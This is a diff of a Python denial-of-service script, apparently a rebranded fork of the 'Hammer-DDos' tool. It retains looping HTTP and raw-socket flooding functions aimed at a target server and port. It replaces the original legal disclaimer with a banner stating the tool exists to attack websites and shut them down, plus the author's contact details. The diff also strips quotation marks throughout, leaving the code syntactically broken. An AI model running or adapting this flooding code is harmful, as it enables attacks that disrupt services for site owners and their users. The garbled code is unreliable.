@@ -49,7 +49,7 @@ def my_bots():
 def bot_hammering(url):
 	try:
 		while True:
-			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={ User-Agent : random.choice(uagent)}))
 			print("\033[94mbot is hammering...\033[0m")
 			time.sleep(.1)
 	except:
@@ -59,7 +59,7 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode( utf-8 )
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
@@ -90,14 +90,48 @@ def dos2():
 
 
 def usage():
-	print (''' \033[92m	Hammer-DDos Attack Tool v1.0
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 hammer.py [-s] [-p] [-t]
+	print (    \033[92m    "Welcome in my dream ♡
+
+┌─────────────────────────────────────────────────────────┐
+│                                                                              │
+│     ███╗   ███╗██████╗    ███████╗ █████╗ ██████╗                │
+│     ████╗ ████║██╔══██╗   ██╔════╝██╔══██╗██╔══██╗            │
+│     ██╔████╔██║██████╔╝   ███████╗███████║██████╔╝            │
+│     ██║╚██╔╝██║██╔══██╗   ╚════██║██╔══██║██╔══██╗            │
+│     ██║ ╚═╝ ██║██║  ██║██╗███████║██║  ██║██║  ██║              │
+│     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝               │
+│                             DEV : ASLEFNDAR                                │
+└─────────────────────────────────────────────────────────┘  
+
+
+        ❥enjoy
+ 
+This tool was created to attack websites and block service from them 
+This tool was developed, built and developed by developer ASLEFNDAR ELYouTuber
+Please follow the sequence of starting the attack and you should know that 
+
+❴ The greater the number of DoS devices, the greater the chance of the site being shut down ❵
+
+  If you find any problem, do not hesitate to contact me on the following social media sites.
+  
+ ___________________________________________________
+                    ⚶ contect ⚶
+➪ insta: @aslefndar_wa
+ 
+➪ whatsapp: +201550746672
+ 
+➪ youtube chanel: @ASLEFNDAR
+ 
+➪ Telegram: @ASLEFNDAR_WA
+____________________________________________________
+
+➥enjoy ♡
+	
+	usage : python3 DDOS.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-t : turbo default 135 \033[0m   )
 	sys.exit()
 
 
@@ -111,9 +145,9 @@ def get_parameters():
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
 	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	optp.add_option("-h","--help",dest="help",action= store_true ,help="help you")
 	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	logging.basicConfig(level=opts.loglevel,format= %(levelname)-8s %(message)s )
 	if opts.help:
 		usage()
 	if opts.host is not None:
@@ -140,7 +174,7 @@ q = Queue()
 w = Queue()
 
 
-if __name__ == '__main__':
+if __name__ ==  __main__ :
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
